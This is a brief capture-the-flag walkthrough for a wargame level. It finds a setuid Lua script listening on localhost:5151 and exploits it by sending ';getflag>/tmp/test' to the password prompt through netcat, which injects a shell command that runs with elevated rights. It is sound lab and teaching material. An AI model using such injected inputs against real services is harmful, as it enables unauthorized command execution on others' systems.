# Level11
## Step by step
- In the user `level11` home directory, there is a file
  ```bash
  > ls
  -rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
  ```
- The file contains a code in Lua that is listening on localhost:5151
  ```bash
  > nc localhost 5151
  Password: ;getflag>/tmp/test
  > cat /tmp/test
  Check flag.Here is your token : XXX
  ```
